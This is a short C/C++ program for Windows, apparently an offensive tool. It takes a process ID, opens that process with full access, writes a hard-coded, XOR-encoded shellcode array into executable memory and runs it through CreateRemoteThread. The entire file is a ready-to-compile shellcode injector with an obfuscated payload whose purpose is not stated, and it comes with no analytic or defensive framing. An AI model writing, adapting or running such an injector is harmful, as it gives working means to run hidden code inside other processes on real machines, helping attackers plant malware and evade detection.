#include <stdio.h>
#include <Windows.h>

using namespace std;


int main(int argc, char* argv[])
{
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD processId = atoi(argv[1]);

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (processHandle == NULL) {
        printf("Failed to open process. Error code: %u\n", GetLastError());
        return 1;
    }

    unsigned char shellcode[] =
"\xeb\x27\x5b\x53\x5f\xb0\x93\xfc\xae\x75\xfd\x57\x59\x53"
"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
"\x29\xea\x74\x07\x80\x3e\x93\x75\xea\xeb\xe6\xff\xe1\xe8"
"\xd4\xff\xff\xff\x14\x93\xe8\x5c\x97\xf0\xe4\xfc\xd4\x14"
"\x14\x14\x55\x45\x55\x44\x46\x45\x42\x5c\x25\xc6\x71\x5c"
"\x9f\x46\x74\x5c\x9f\x46\x0c\x5c\x9f\x46\x34\x5c\x9f\x66"
"\x44\x5c\x1b\xa3\x5e\x5e\x59\x25\xdd\x5c\x25\xd4\xb8\x28"
"\x75\x68\x16\x38\x34\x55\xd5\xdd\x19\x55\x15\xd5\xf6\xf9"
"\x46\x55\x45\x5c\x9f\x46\x34\x9f\x56\x28\x5c\x15\xc4\x9f"
"\x94\x9c\x14\x14\x14\x5c\x91\xd4\x60\x73\x5c\x15\xc4\x44"
"\x9f\x5c\x0c\x50\x9f\x54\x34\x5d\x15\xc4\xf7\x42\x5c\xeb"
"\xdd\x55\x9f\x20\x9c\x5c\x15\xc2\x59\x25\xdd\x5c\x25\xd4"
"\xb8\x55\xd5\xdd\x19\x55\x15\xd5\x2c\xf4\x61\xe5\x58\x17"
"\x58\x30\x1c\x51\x2d\xc5\x61\xcc\x4c\x50\x9f\x54\x30\x5d"
"\x15\xc4\x72\x55\x9f\x18\x5c\x50\x9f\x54\x08\x5d\x15\xc4"
"\x55\x9f\x10\x9c\x5c\x15\xc4\x55\x4c\x55\x4c\x4a\x4d\x4e"
"\x55\x4c\x55\x4d\x55\x4e\x5c\x97\xf8\x34\x55\x46\xeb\xf4"
"\x4c\x55\x4d\x4e\x5c\x9f\x06\xfd\x43\xeb\xeb\xeb\x49\x5d"
"\xaa\x63\x67\x26\x4b\x27\x26\x14\x14\x55\x42\x5d\x9d\xf2"
"\x5c\x95\xf8\xb4\x15\x14\x14\x5d\x9d\xf1\x5d\xa8\x16\x14"
"\x15\xaf\xd4\xbc\x15\x17\x55\x40\x5d\x9d\xf0\x58\x9d\xe5"
"\x55\xae\x58\x63\x32\x13\xeb\xc1\x58\x9d\xfe\x7c\x15\x15"
"\x14\x14\x4d\x55\xae\x3d\x94\x7f\x14\xeb\xc1\x44\x44\x59"
"\x25\xdd\x59\x25\xd4\x5c\xeb\xd4\x5c\x9d\xd6\x5c\xeb\xd4"
"\x5c\x9d\xd5\x55\xae\xfe\x1b\xcb\xf4\xeb\xc1\x5c\x9d\xd3"
"\x7e\x04\x55\x4c\x58\x9d\xf6\x5c\x9d\xed\x55\xae\x8d\xb1"
"\x60\x75\xeb\xc1\x5c\x95\xd0\x54\x16\x14\x14\x5d\xac\x77"
"\x79\x70\x14\x14\x14\x14\x14\x55\x44\x55\x44\x5c\x9d\xf6"
"\x43\x43\x43\x59\x25\xd4\x7e\x19\x4d\x55\x44\xf6\xe8\x72"
"\xd3\x50\x30\x40\x15\x15\x5c\x99\x50\x30\x0c\xd2\x14\x7c"
"\x5c\x9d\xf2\x42\x44\x55\x44\x55\x44\x55\x44\x5d\xeb\xd4"
"\x55\x44\x5d\xeb\xdc\x59\x9d\xd5\x58\x9d\xd5\x55\xae\x6d"
"\xd8\x2b\x92\xeb\xc1\x5c\x25\xc6\x5c\xeb\xde\x9f\x1a\x55"
"\xae\x1c\x93\x09\x74\xeb\xc1\xaf\xe4\xa1\xb6\x42\x55\xae"
"\xb2\x81\xa9\x89\xeb\xc1\x5c\x97\xd0\x3c\x28\x12\x68\x1e"
"\x94\xef\xf4\x61\x11\xaf\x53\x07\x66\x7b\x7e\x14\x4d\x55"
"\x9d\xce\xeb\xc1\x29\xea";

    LPVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        printf("Failed to allocate remote buffer. Error code: %u\n", GetLastError());
        CloseHandle(processHandle);
        return 1;
    }

    if (!WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof(shellcode), NULL)) {
        printf("Failed to write shellcode to remote process. Error code: %u\n", GetLastError());
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (remoteThread == NULL) {
        printf("Failed to create remote thread. Error code: %u\n", GetLastError());
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }
    printf("Shellcode injected successfully.\n");

    // Cleanup
    CloseHandle(remoteThread);
    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(processHandle);

    return 0;
}
